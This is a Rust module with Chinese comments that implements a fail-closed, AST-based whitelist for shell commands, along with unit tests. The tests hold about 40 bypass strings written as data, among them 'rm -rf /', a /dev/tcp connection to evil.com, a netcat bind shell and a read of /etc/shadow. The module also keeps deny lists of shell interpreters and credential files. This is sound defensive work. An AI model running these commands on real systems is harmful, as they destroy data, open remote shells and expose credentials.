//! Shell 命令白名单引擎 (T2.2)
//!
//! 使用 tree-sitter-bash 解析 shell 命令为 AST，然后：
//! 1. 拒绝任何包含危险结构的 AST（展开、管道、重定向等）
//! 2. 拒绝一切未显式白名单的命令（fail-closed）
//! 3. 返回规范化的 argv[] 供安全执行

use tree_sitter::{Language, Node, Parser};

// ── 公共类型 ──────────────────────────────────────────────────────────────────

/// 通过白名单检查的命令，argv 已规范化。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CheckedCommand {
    pub argv: Vec<String>,
}

/// 白名单引擎的决策结果。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    Allow(CheckedCommand),
    /// v0.3+ 激活：展示 argv 给用户确认。v0.2 暂未启用。
    RequireConfirm(CheckedCommand),
    Deny(String),
}

// ── 拒绝的 AST 节点类型 ───────────────────────────────────────────────────────

const DENIED_NODE_KINDS: &[&str] = &[
    "command_substitution", // $(...)  `...`
    "process_substitution", // <(...) >(...)
    "heredoc_redirect",     // << EOF
    "herestring_redirect",  // <<< string
    "ansi_c_string",        // $'...'
    "simple_expansion",     // $VAR — probe argv 必须全部字面量，不允许变量
    "pipeline",             // a | b
    "list",                 // a ; b  a && b  a || b
    "redirected_statement", // 任何带重定向的命令
    "brace_expression",     // {1..3}
    "negated_command",      // ! cmd
    "subshell",             // (...)
    "arithmetic_expansion", // $((...))
];

/// 危险的 shell 解释器命令（直接调用即拒绝）
const SHELL_INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "eval", "source", "exec"];

/// Unicode 方向控制字符 — 可在 UI 反转文本显示，混淆命令外观
const UNICODE_DIR_OVERRIDES: &[char] = &[
    '\u{202A}', // LEFT-TO-RIGHT EMBEDDING
    '\u{202B}', // RIGHT-TO-LEFT EMBEDDING
    '\u{202C}', // POP DIRECTIONAL FORMATTING
    '\u{202D}', // LEFT-TO-RIGHT OVERRIDE
    '\u{202E}', // RIGHT-TO-LEFT OVERRIDE (RLI)
    '\u{2066}', // LEFT-TO-RIGHT ISOLATE
    '\u{2067}', // RIGHT-TO-LEFT ISOLATE
    '\u{2068}', // FIRST STRONG ISOLATE
    '\u{2069}', // POP DIRECTIONAL ISOLATE
    '\u{200B}', // ZERO WIDTH SPACE
    '\u{200C}', // ZERO WIDTH NON-JOINER
    '\u{200D}', // ZERO WIDTH JOINER
    '\u{FEFF}', // ZERO WIDTH NO-BREAK SPACE (BOM)
];

/// 敏感路径前缀 — 即使是只读命令也不允许读取这些文件
const SENSITIVE_PATH_PREFIXES: &[&str] = &[
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/master.passwd", // BSD
];

// ── 白名单规则 ────────────────────────────────────────────────────────────────

struct AllowRule {
    /// argv[0]（命令名）
    cmd: &'static str,
    /// Some([...]) → argv[1] 必须匹配其中之一；None → 任何参数均允许
    first_arg: Option<&'static [&'static str]>,
}

impl AllowRule {
    const fn any(cmd: &'static str) -> Self {
        AllowRule {
            cmd,
            first_arg: None,
        }
    }
    const fn subcommand(cmd: &'static str, args: &'static [&'static str]) -> Self {
        AllowRule {
            cmd,
            first_arg: Some(args),
        }
    }
}

/// 10 条只读白名单规则（SPEC §5 T2.2）
const ALLOW_RULES: &[AllowRule] = &[
    AllowRule::any("ls"),
    AllowRule::any("cat"),
    AllowRule::any("stat"),
    AllowRule::any("ps"),
    AllowRule::any("df"),
    AllowRule::any("du"),
    AllowRule::subcommand("systemctl", &["status"]),
    AllowRule::any("journalctl"),
    AllowRule::subcommand("docker", &["ps"]),
    AllowRule::subcommand("nginx", &["-t"]),
];

// ── 公开 API ──────────────────────────────────────────────────────────────────

/// 检查 shell 命令字符串是否在白名单中。
/// 成功时返回 `Decision::Allow(CheckedCommand)`，包含规范化 argv。
/// 任何策略违规返回 `Decision::Deny(reason)`。
/// Fail-closed：未显式允许的命令一律拒绝。
pub fn check(input: &str) -> Decision {
    let trimmed = input.trim();

    if trimmed.is_empty() {
        return Decision::Deny("空命令".to_string());
    }

    // 长度保护，防止解析器复杂度攻击
    if trimmed.len() > 10_000 {
        return Decision::Deny("命令过长".to_string());
    }

    // Unicode 方向控制字符 — 可混淆 UI 显示，一律拒绝
    if trimmed.chars().any(|c| UNICODE_DIR_OVERRIDES.contains(&c)) {
        return Decision::Deny("输入包含 Unicode 方向控制字符".to_string());
    }

    let mut parser = Parser::new();
    if let Err(e) = parser.set_language(&bash_language()) {
        return Decision::Deny(format!("语言加载失败: {e}"));
    }

    let tree = match parser.parse(trimmed, None) {
        Some(t) => t,
        None => return Decision::Deny("AST 解析失败".to_string()),
    };

    let root = tree.root_node();
    let src = trimmed.as_bytes();

    // Step 1：扫描全 AST，拒绝危险节点
    if let Some(reason) = scan_dangerous(&root, src) {
        return Decision::Deny(reason);
    }

    // Step 2：顶层必须是且仅是一个 `command` 节点（无管道/列表/if/for）
    let meaningful: Vec<Node> = (0..root.child_count())
        .filter_map(|i| root.child(i))
        .filter(|n| n.is_named() && n.kind() != "comment")
        .collect();

    if meaningful.len() != 1 {
        let kinds: Vec<&str> = meaningful.iter().map(|n| n.kind()).collect();
        return Decision::Deny(format!("不允许多语句结构: {:?}", kinds));
    }

    let stmt = &meaningful[0];
    if stmt.kind() != "command" {
        return Decision::Deny(format!("不允许的语句类型: {}", stmt.kind()));
    }

    // Step 3：提取 argv
    let argv = extract_argv(stmt, src);
    if argv.is_empty() {
        return Decision::Deny("无法提取命令名".to_string());
    }

    // Step 4a：拒绝包含敏感路径的参数
    for arg in &argv {
        for prefix in SENSITIVE_PATH_PREFIXES {
            if arg.as_str() == *prefix || arg.starts_with(&format!("{}/", prefix)) {
                return Decision::Deny(format!("不允许访问敏感路径: {}", arg));
            }
        }
    }

    // Step 4b：拒绝直接调用 shell 解释器
    if SHELL_INTERPRETERS.contains(&argv[0].as_str()) {
        return Decision::Deny(format!("不允许调用 shell 解释器: {}", argv[0]));
    }

    // Step 5：匹配白名单规则（fail-closed）
    for rule in ALLOW_RULES {
        if argv[0] != rule.cmd {
            continue;
        }
        if let Some(required) = rule.first_arg {
            match argv.get(1).map(String::as_str) {
                None => {
                    return Decision::Deny(format!(
                        "{} 缺少必要参数（允许: {:?}）",
                        rule.cmd, required
                    ))
                }
                Some(a) if !required.contains(&a) => {
                    return Decision::Deny(format!(
                        "{} {} 不在白名单中（允许: {:?}）",
                        rule.cmd, a, required
                    ))
                }
                _ => {}
            }
        }
        return Decision::Allow(CheckedCommand { argv });
    }

    Decision::Deny(format!("命令 '{}' 不在白名单中", argv[0]))
}

// ── 内部工具函数 ──────────────────────────────────────────────────────────────

fn bash_language() -> Language {
    tree_sitter_bash::language()
}

/// 递归扫描 AST，返回第一个危险节点的描述，无则 None。
fn scan_dangerous(node: &Node, src: &[u8]) -> Option<String> {
    let kind = node.kind();

    if DENIED_NODE_KINDS.contains(&kind) {
        return Some(format!("不允许的 shell 结构: {}", kind));
    }

    // 变量间接引用：${!var}
    if kind == "expansion" {
        if let Ok(text) = node.utf8_text(src) {
            if text.starts_with("${!") {
                return Some("不允许变量间接引用: ${!...}".to_string());
            }
        }
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(reason) = scan_dangerous(&child, src) {
            return Some(reason);
        }
    }

    None
}

/// 从 `command` 节点提取 argv 向量。
/// expansion/command_substitution 等危险节点已在 scan_dangerous 中被捕获。
fn extract_argv(node: &Node, src: &[u8]) -> Vec<String> {
    let mut argv = Vec::new();
    let mut cursor = node.walk();

    for child in node.children(&mut cursor) {
        match child.kind() {
            "command_name" => {
                // command_name 内部包含实际的 word/variable 节点
                let mut inner = child.walk();
                for inner_child in child.children(&mut inner) {
                    if let Ok(text) = inner_child.utf8_text(src) {
                        let t = text.trim();
                        if !t.is_empty() {
                            argv.push(t.to_string());
                            break;
                        }
                    }
                }
            }
            "word" | "raw_string" | "number_literal" => {
                if let Ok(text) = child.utf8_text(src) {
                    let t = text.trim();
                    if !t.is_empty() {
                        argv.push(t.to_string());
                    }
                }
            }
            "string" => {
                // 带引号的字符串，去除外层引号
                if let Ok(text) = child.utf8_text(src) {
                    let inner = text
                        .trim()
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches('\'')
                        .trim_end_matches('\'');
                    if !inner.is_empty() {
                        argv.push(inner.to_string());
                    }
                }
            }
            _ => {} // 忽略重定向、分号等 — 这些已在 scan_dangerous 中被捕获
        }
    }

    argv
}

// ── 单元测试 ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn allow_argv(input: &str) -> Vec<String> {
        match check(input) {
            Decision::Allow(cmd) => cmd.argv,
            other => panic!("期望 Allow，但得到 {:?} for {:?}", other, input),
        }
    }

    fn assert_deny(input: &str) {
        match check(input) {
            Decision::Deny(_) => {}
            other => panic!("期望 Deny，但得到 {:?} for {:?}", other, input),
        }
    }

    // ─── 10 条白名单规则 ───────────────────────────────────────────────────────

    #[test]
    fn allow_ls_bare() {
        assert_eq!(allow_argv("ls"), vec!["ls"]);
    }

    #[test]
    fn allow_ls_with_flags() {
        let argv = allow_argv("ls -la /tmp");
        assert_eq!(argv[0], "ls");
        assert!(argv.contains(&"-la".to_string()));
    }

    #[test]
    fn allow_cat_file() {
        let argv = allow_argv("cat /etc/nginx/nginx.conf");
        assert_eq!(argv[0], "cat");
    }

    #[test]
    fn allow_stat_file() {
        let argv = allow_argv("stat /var/log/syslog");
        assert_eq!(argv[0], "stat");
    }

    #[test]
    fn allow_ps_aux() {
        let argv = allow_argv("ps aux");
        assert_eq!(argv[0], "ps");
    }

    #[test]
    fn allow_df_h() {
        let argv = allow_argv("df -h");
        assert_eq!(argv[0], "df");
    }

    #[test]
    fn allow_du_sh() {
        let argv = allow_argv("du -sh /var");
        assert_eq!(argv[0], "du");
    }

    #[test]
    fn allow_systemctl_status() {
        let argv = allow_argv("systemctl status nginx");
        assert_eq!(argv[0], "systemctl");
        assert_eq!(argv[1], "status");
    }

    #[test]
    fn allow_journalctl_n() {
        let argv = allow_argv("journalctl -n 100");
        assert_eq!(argv[0], "journalctl");
    }

    #[test]
    fn allow_docker_ps() {
        let argv = allow_argv("docker ps");
        assert_eq!(argv[0], "docker");
        assert_eq!(argv[1], "ps");
    }

    #[test]
    fn allow_nginx_t() {
        let argv = allow_argv("nginx -t");
        assert_eq!(argv[0], "nginx");
        assert_eq!(argv[1], "-t");
    }

    // ─── 拒绝：管道 ───────────────────────────────────────────────────────────

    #[test]
    fn deny_pipe_rm() {
        assert_deny("ls; rm -rf /");
    }

    #[test]
    fn deny_pipe_and() {
        assert_deny("ls && rm x");
    }

    #[test]
    fn deny_pipe_or() {
        assert_deny("ls || rm x");
    }

    #[test]
    fn deny_pipe_to_rm() {
        assert_deny("ls | rm x");
    }

    // ─── 拒绝：重定向 ─────────────────────────────────────────────────────────

    #[test]
    fn deny_redirect_write() {
        assert_deny("ls > /etc/passwd");
    }

    #[test]
    fn deny_redirect_append() {
        assert_deny("ls >> /etc/hosts");
    }

    // ─── 拒绝：命令替换 ───────────────────────────────────────────────────────

    #[test]
    fn deny_command_substitution() {
        assert_deny("ls $(rm x)");
    }

    // ─── 拒绝：不在白名单的命令 ───────────────────────────────────────────────

    #[test]
    fn deny_rm() {
        assert_deny("rm -rf /");
    }

    #[test]
    fn deny_systemctl_start() {
        assert_deny("systemctl start nginx");
    }

    #[test]
    fn deny_docker_exec() {
        assert_deny("docker exec nginx bash");
    }

    #[test]
    fn deny_nginx_start() {
        assert_deny("nginx -s reload");
    }

    #[test]
    fn deny_sudo() {
        assert_deny("sudo ls");
    }

    #[test]
    fn deny_shell_interpreter_bash() {
        assert_deny("bash -c 'rm x'");
    }

    #[test]
    fn deny_eval() {
        assert_deny("eval 'rm x'");
    }

    // ─── 边界条件 ─────────────────────────────────────────────────────────────

    #[test]
    fn deny_empty() {
        assert_deny("");
    }

    #[test]
    fn deny_too_long() {
        assert_deny(&"a".repeat(10_001));
    }

    #[test]
    fn deny_unknown_command() {
        assert_deny("foo --bar");
    }

    // ─── T2.3 Bypass 测试（全 40 条，按 SPEC §5 T2.3 编号）─────────────────────

    mod bypass {
        use super::super::check;
        use super::super::Decision;

        fn deny(input: &str) {
            match check(input) {
                Decision::Deny(_) => {}
                other => panic!("Bypass #{}: 期望 Deny，但得到 {:?}", input, other),
            }
        }

        // 1–10 基础拼接
        #[test]
        fn b01_semicolon() {
            deny("ls; rm -rf /");
        }
        #[test]
        fn b02_and() {
            deny("ls && rm x");
        }
        #[test]
        fn b03_or() {
            deny("ls || rm x");
        }
        #[test]
        fn b04_pipe() {
            deny("ls | rm x");
        }
        #[test]
        fn b05_redirect_w() {
            deny("ls > /etc/passwd");
        }
        #[test]
        fn b06_redirect_a() {
            deny("ls >> /etc/hosts");
        }
        #[test]
        fn b07_tee() {
            deny("tee /etc/sudoers");
        }
        #[test]
        fn b08_dd() {
            deny("dd of=/dev/sda");
        }
        #[test]
        fn b09_find_exec() {
            deny("find / -exec rm {} ;");
        }
        #[test]
        fn b10_find_delete() {
            deny("find / -delete");
        }

        // 11–25 Expansion 攻击
        #[test]
        fn b11_cmd_subst() {
            deny("ls $(rm x)");
        }
        #[test]
        fn b12_backtick() {
            deny("ls `rm x`");
        }
        #[test]
        fn b13_proc_subst_r() {
            deny("<(rm x)");
        }
        #[test]
        fn b14_proc_subst_w() {
            deny(">(cat /etc/shadow)");
        }
        #[test]
        fn b15_ansi_c() {
            deny("$'\\x72m' x");
        }
        #[test]
        fn b16_brace_exp() {
            deny("{rm,-rf,/tmp/x}");
        }
        #[test]
        fn b17_var_indirect() {
            deny("CMD=rm; $CMD x");
        }
        #[test]
        fn b18_herestring() {
            deny("cat<<<\"rm x\" | sh");
        }
        #[test]
        fn b19_awk_system() {
            deny("awk 'BEGIN{system(\"rm x\")}'");
        }
        #[test]
        fn b20_ansi_newline() {
            deny("ls $'\\n'rm x");
        }
        #[test]
        fn b21_unicode_rli() {
            deny("ls \u{202E}evil");
        }
        #[test]
        fn b22_comment_nl() {
            deny("ls #\nrm x");
        }
        #[test]
        fn b23_func_redef() {
            deny("readonly -f cmd; cmd () { rm; }");
        }
        #[test]
        fn b24_tcp_redir() {
            deny("exec 3<>/dev/tcp/evil.com/80");
        }
        #[test]
        fn b25_ifs_trick() {
            deny("ls $IFS rm");
        }

        // 26–32 管道入 shell
        #[test]
        fn b26_tee_write() {
            deny("journalctl | tee /etc/nginx/nginx.conf");
        }
        #[test]
        fn b27_pipe_bash() {
            deny("cat /etc/passwd | bash");
        }
        #[test]
        fn b28_echo_sh() {
            deny("echo rm | sh");
        }
        #[test]
        fn b29_eval() {
            deny("eval \"rm x\"");
        }
        #[test]
        fn b30_source() {
            deny("source /tmp/evil.sh");
        }
        #[test]
        fn b31_dot() {
            deny(". /tmp/evil.sh");
        }
        #[test]
        fn b32_bash_c() {
            deny("bash -c \"rm x\"");
        }

        // 33–40 权限 / 子命令攻击
        #[test]
        fn b33_sudo() {
            deny("sudo ls");
        }
        #[test]
        fn b34_svc_start() {
            deny("systemctl start nginx");
        }
        #[test]
        fn b35_docker_exec() {
            deny("docker exec nginx bash");
        }
        #[test]
        fn b36_chmod() {
            deny("chmod 777 /etc/nginx.conf");
        }
        #[test]
        fn b37_nc_shell() {
            deny("nc -l 1234 -e /bin/bash");
        }
        #[test]
        fn b38_tail_zero() {
            deny("tail -f /dev/zero");
        }
        #[test]
        fn b39_shadow() {
            deny("ls /etc/shadow");
        }
        #[test]
        fn b40_length() {
            deny(&"a".repeat(10_001));
        }
    }
}
